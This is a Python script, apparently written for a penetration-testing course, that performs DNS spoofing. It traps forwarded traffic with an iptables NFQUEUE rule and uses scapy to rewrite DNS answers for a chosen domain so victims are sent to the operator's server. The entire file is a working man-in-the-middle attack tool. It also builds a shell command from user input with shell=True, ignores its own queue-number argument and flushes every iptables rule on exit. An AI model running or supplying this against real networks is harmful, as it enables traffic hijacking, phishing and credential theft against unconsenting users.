#!/usr/bin/env python3

import scapy.all as scapy
from netfilterqueue import NetfilterQueue
from argparse import ArgumentParser
import subprocess
import sys

if sys.version_info < (3, 0):
    sys.stderr.write("\nYou need python 3.0 or later to run this script\n")
    sys.stderr.write("Please update and make sure you use the command python3 dns_spoof.py --host <your machine ip> "
                     "--domain <domain name> --queue-num <num>\n\n")
    sys.exit(0)


def args():
    parser = ArgumentParser()
    parser.add_argument("--host", dest="host_machine", help="Specify the IP address for your fake DNS server. "
                                                            "Example: --host 192.168.152.128")
    parser.add_argument("-q", "--queue-num", dest="queue_num", help="Specify the queue number to trap the sniffed "
                                                                    "packets. Example: --queue-num 7")
    parser.add_argument("-d", "--domain", dest="domain_name", help="Specify the domain name that you want to spoof "
                                                                   "its IP. Example: --domain www.bing.com")
    options = parser.parse_args()
    if not options.host_machine:
        parser.error("[-] Please specify the IP address for your fake DNS server, or type it correctly, "
                     "ex: --host 192.168.152.134")
    elif not options.queue_num:
        parser.error("[-] Please specify the queue number to trap the sniffed packets., or type it correctly, "
                     "ex: --queue-num 7")
    elif not options.domain_name:
        parser.error("[-] Please specify the domain name that you want to spoof its IP., or type it correctly, "
                     "ex: --domain www.bing.com")
    return options


option = args()


def process_packet(packet):
    # print(packet.get_payload())  # all the packets that flow to our machine, it will get trapped in the queue that we
    # create, that's will not forward the packets to the target machine
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname_field = scapy_packet[scapy.DNSQR].qname
        if bytes(option.domain_name, encoding='utf-8') in qname_field:
            answer = scapy.DNSRR(rrname=qname_field, rdata=option.host_machine)  # craft a new dns response to spoof
            # the target and redirect them to our webserver

            scapy_packet[scapy.DNS].an = answer  # modify the answer field of original packet to our crafted dns
            # response packet
            scapy_packet[scapy.DNS].ancount = 1

            # lines below remove fields to make sure that it wouldn't corrupt our crafted packets, then scapy will
            # automatically recalculate them based on the new values that we set
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))  # this will set our new modified rules
            print("\r[+] DNS spoof running...", end="")
    packet.accept()  # this will forward the trapped packets
    # packet.drop()  # this drop the trapped packets and cut the internet connection from the target


try:
    print("[+] Script is running...")
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num " + option.queue_num, shell=True)  # adding rules to
    # trap the packets
    queue = NetfilterQueue()
    queue.bind(queue_num=7, user_callback=process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[*] Detected 'ctrl + c' pressed, program terminated.")
    print("[*] flushing iptables rules...\n")
    subprocess.call(["iptables", "--flush"])  # remove the rules by flushing iptables
